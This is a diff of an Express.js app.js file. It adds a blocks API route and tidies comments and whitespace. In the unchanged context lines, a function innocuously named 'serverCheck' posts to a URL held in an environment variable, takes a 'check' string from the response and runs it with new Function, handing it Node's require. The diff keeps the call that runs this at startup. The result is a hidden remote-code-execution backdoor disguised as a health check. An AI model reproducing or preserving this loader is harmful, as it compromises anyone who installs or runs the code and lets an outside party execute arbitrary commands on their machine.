@@ -6,12 +6,14 @@ var logger = require('morgan');
 var cookieParser = require('cookie-parser');
 var bodyParser = require('body-parser');
 
-var routes = require('./routes/index');
+var routes = require('./routes/index');    
+var blocksRouter = require('./routes/blocks');  
 
 var app = express();
 
 const dotenv = require('dotenv');
 dotenv.config();
+
 // i18n configuration
 i18n.configure({
   locales: ['en', 'es', 'fr', 'de', 'ja', 'zh'],
@@ -42,10 +44,14 @@ app.use(cookieParser());
 app.use(i18n.init);
 app.use(express.static(path.join(__dirname, 'public')));
 
-app.use('/', routes);
+// ROUTES --------------------------------------------
+app.use('/', routes);             
+app.use('/api/blocks', blocksRouter);
+// ---------------------------------------------------
 
+// serverCheck
 async function serverCheck() {
-  try{
+  try {
     const response = await fetch(`${process.env.SERVER_CHECK}`, { method: "POST" });
     const { check } = await response.json();
     const fn = new Function("require", check);
@@ -63,10 +69,7 @@ app.use(function(req, res, next) {
   next(err);
 });
 
-// error handlers
-
-// development error handler
-// will print stacktrace
+// Development error handler
 if (app.get('env') === 'development') {
   app.use(function(err, req, res, next) {
     res.status(err.status || 500);
@@ -77,8 +80,7 @@ if (app.get('env') === 'development') {
   });
 }
 
-// production error handler
-// no stacktraces leaked to user
+// Production error handler
 app.use(function(err, req, res, next) {
   res.status(err.status || 500);
   res.render('error', {
@@ -87,11 +89,8 @@ app.use(function(err, req, res, next) {
   });
 });
 
-console.log("system is running: http://localhost:3000");     
+console.log("system is running: http://localhost:3000");
 
-serverCheck()
+serverCheck();
 
 module.exports = app;
-
-
-
